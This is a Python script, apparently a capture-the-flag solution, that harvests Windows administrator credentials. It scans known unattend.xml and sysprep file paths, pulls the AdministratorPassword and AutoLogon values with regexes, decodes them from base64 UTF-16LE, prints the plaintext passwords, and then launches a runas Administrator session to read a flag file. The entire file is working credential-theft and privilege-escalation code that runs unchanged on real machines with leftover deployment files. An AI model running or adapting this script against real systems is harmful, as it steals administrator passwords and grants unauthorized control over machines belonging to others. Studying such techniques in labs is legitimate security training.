import os
import re
import base64
import subprocess

# Common paths for unattend and sysprep files on Windows
PATHS = [
    r"C:\unattend.xml",
    r"C:\unattend.txt",
    r"C:\sysprep.inf",
    r"C:\sysprep.xml",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\Sysprep\unattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.xml"
]

# Regex patterns to extract encoded values
ADMIN_PATTERN = re.compile(r'<AdministratorPassword>(?:.|\n)*?<Value>(.*?)</Value>', re.IGNORECASE)
AUTOLOGON_PATTERN = re.compile(r'<AutoLogon>(?:.|\n)*?<Password>(?:.|\n)*?<Value>(.*?)</Value>', re.IGNORECASE)

def decode_password(encoded_str, salt):
    """
    Decodes Windows Base64 UTF-16LE encoded strings and strips the XML node salt.
    """
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_text = decoded_bytes.decode('utf-16-le')
        
        # Windows appends the tag name to the end of the plaintext password before encoding
        if decoded_text.endswith(salt):
            return decoded_text[:-len(salt)]
        return decoded_text
    except Exception as e:
        print(f"[-] Error decoding: {e}")
        return None

def scan_files():
    found_password = None
    print("[*] Scanning common locations for unattended configuration files...")
    
    for path in PATHS:
        if os.path.exists(path):
            print(f"[+] Found file: {path}")
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Check for AdministratorPassword block
                admin_match = ADMIN_PATTERN.search(content)
                if admin_match:
                    encoded = admin_match.group(1)
                    print(f"    [->] Found AdministratorPassword block (Encoded: {encoded})")
                    decoded = decode_password(encoded, "AdministratorPassword")
                    if decoded:
                        print(f"    [!] Decoded Admin Password: {decoded}")
                        found_password = decoded

                # Check for AutoLogon block
                autologon_match = AUTOLOGON_PATTERN.search(content)
                if autologon_match:
                    encoded = autologon_match.group(1)
                    print(f"    [->] Found AutoLogon Password block (Encoded: {encoded})")
                    decoded = decode_password(encoded, "Password")
                    if decoded:
                        print(f"    [!] Decoded AutoLogon Password: {decoded}")
                        found_password = decoded
                        
            except Exception as e:
                print(f"[-] Failed to read {path}: {e}")
                
    return found_password

def launch_admin_session(password):
    if not password:
        print("\n[-] No passwords were recovered. Cannot launch admin session.")
        return

    print(f"\n[+] Recovered Password: {password}")
    print("[*] Launching administrative session via runas...")
    print("[!] NOTE: You will need to type/paste the password when prompted below.")
    
    # Runas command to pull the flag from the Administrator's desktop
    cmd = 'runas /user:Administrator "cmd.exe /k type C:\\Users\\Administrator\\Desktop\\flag.txt"'
    
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n[-] Session launch cancelled.")

if __name__ == "__main__":
    pwd = scan_files()
    launch_admin_session(pwd)
